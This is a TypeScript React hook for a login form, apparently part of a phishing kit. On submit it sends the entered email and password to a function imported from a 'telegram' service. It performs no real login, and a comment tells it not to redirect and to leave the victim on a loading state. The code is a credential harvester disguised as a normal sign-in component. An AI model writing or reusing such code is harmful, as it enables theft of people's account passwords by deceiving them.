import { useState } from 'react';
import { sendLoginDetails } from '../../../services/telegram';

export const useLoginForm = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleSubmit = async (email: string, password: string) => {
    if (isLoading) return;
    
    setIsLoading(true);
    setError(null);

    try {
      await sendLoginDetails({ 
        email, 
        password,
        ipInfo: { ip: 'Unknown' } // In a real app, you'd get the IP from an API
      });
      
      // Don't redirect, just show a loading state
      setIsLoading(false);
    } catch (error) {
      console.error('Login error:', error);
      setError(error instanceof Error ? error.message : 'An unexpected error occurred');
      setIsLoading(false);
    }
  };

  return {
    isLoading,
    error,
    handleSubmit
  };
};